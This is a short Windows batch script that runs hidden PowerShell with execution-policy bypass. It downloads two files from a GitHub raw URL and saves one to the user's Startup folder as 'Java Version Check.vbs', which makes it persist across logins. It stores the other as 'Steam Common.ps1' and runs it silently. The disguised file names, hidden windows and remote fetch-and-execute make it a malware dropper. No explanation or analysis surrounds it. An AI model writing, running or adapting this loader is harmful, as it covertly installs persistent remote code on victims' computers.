@echo off
set "destino=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Java Version Check.vbs"
set "destino2=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Steam Common.ps1"
powershell -w h -NoP -NonI -Exec Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/startup.vbs?dl=1' -OutFile '%destino%'"
powershell -w h -NoP -NonI -Exec Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/windows.ps1?dl=1' -OutFile '%destino2%'"
powershell -w h -NoP -NonI -Exec Bypass -File "%destino2%"